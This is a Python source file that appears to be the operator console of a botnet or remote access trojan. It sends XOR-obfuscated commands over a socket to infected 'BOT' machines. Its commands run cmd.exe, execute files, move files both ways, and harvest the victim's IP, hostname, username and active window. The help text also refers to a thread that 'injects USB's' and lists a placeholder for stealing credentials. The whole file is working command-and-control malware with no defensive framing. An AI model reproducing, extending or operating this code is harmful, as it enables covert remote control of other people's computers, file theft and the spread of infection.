from .spmain import *
from .infodb import xor

def run_session(sockfd,mode, input_string, cid_int, infoFor):

    def SendData(data):
        try:
            ToSend = xor(data)
            sockfd.send(ToSend.encode())
        except Exception as serror:
            print("[ERROR] " + str(serror))
    
    def SendBytes(data):
        """ File Content is sent without Encryption """ 
        try:
            sockfd.send(data)
        except Exception as error:
            clients.remove(sockfd)
            print(Style.BRIGHT + "Error Occured : " + str(error))
    

    def filetransfer():
        mfile = input("[+] File Path : ")
        rfile = input("[+] File name to Save as : ")
        try:
            with open(mfile, "rb") as sendfile:
                SendData("recvthis="+rfile)
                data = sendfile.read()
                bufferst = os.stat(mfile)
                print("[+] File opened " + mfile + " ("+str(bufferst.st_size) + " bytes)" )
                SendBytes(data)
                print("[+] File Sent.")
        except FileNotFoundError:
            print("[x] File not found!?")
        except Exception as e:
            print("[x] Error : " + str(e))

    while(mode):
        try:
            sinput = input(input_string)
            args = sinput.split()
            if(sinput == "exit"):
                mode = False

            elif(sinput == "botinfo"):
                try:
                    ReadInformation(infoFor)
                except IndexError:  
                    print("--> BOT is not online!?")
            
            elif(sinput == "msgbox"):
                try:
                    title = input("-> Enter MessageBox Title : ")
                    message = input("-> Enter Messagebox Message : ")
                    SendData("msgbox="+message+"="+title)
                except Exception as e:
                    print("Error : {error}.".format(error=str(e)))
                
            elif(sinput == "ls"):
                SendData("ls")

            elif(sinput == "exec"):
                filename = input("-> Enter filename to Execute : ")
                if(len(filename) > 0):
                    SendData("exec="+filename)

            elif(sinput.startswith("download")):
                try:
                    todownload = input("[+] Enter filename to Download : ")
                    askd = input("-> Confirm download file '{file}' .. ? (y/N): ".format(file=todownload))
                    askd = askd.lower()
                    if(askd == "y"):
                        SendData("sendme="+todownload)
                except IndexError: 
                    print("[x] USAGE : download <filename>")
            elif(sinput == "upload"):
                filetransfer()
                        
            elif(sinput.startswith("cd")):
                try:
                    param = sinput.split()
                    if(param[1] == "-s"):
                        directory = input("-> Enter Directory name : ")
                        SendData("cd="+directory)
                    else:
                        SendData("cd="+param[1])

                except IndexError:
                    print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] USAGE : cd < Directory >")
                    
            elif(sinput == "cmd"):
                cmd = input("[+] Enter Command : cmd.exe /c ")
                if(len(cmd) > 0):
                    SendData("cmd="+cmd)

            elif(sinput == "help"):
                print(""" 
                Direct BOT commands
                ====================
                (1). botinfo - View Botinfo
                (2). msgbox - Send messagebox.
                (3). send < data > - Send a command directly.
                (4). cmd - Only Execute a Command on the System, No output is returned.
                (5). upload - Upload a file.
                (6). download - Download a file.
                (7). cd < dir > - Change directories. (Use -s switch to specify directory name with spaces)
                (8). ls - List files in current directory.

                Use with Send
                =============
                (1). send -> test 
                    | Misc Command.
                (2). send -> windowname
                    | Get Active Window name.
                (3). send -> cfolder
                    | Get current folder name without FSConsole.
                (4). send -> usb.thread
                    | Check if USB Thread is running. The thread that injects USB's.
                (5). send -> wanip
                    | Get WAN IP Directly.
                (6). send -> hostname
                    | Get Hostname Directly.
                (7). send -> username
                    | Get Username Directly.
                (8). send -> creds
                   | Not Added yet. 
                (9). send -> jre
                    | Check if Java is installed or not.
                """)

            elif(sinput.startswith("send")):
                try:
                    SendData(args[1])
                except IndexError:
                    print("USAGE : send <data>")
        except KeyboardInterrupt:
            mode = False
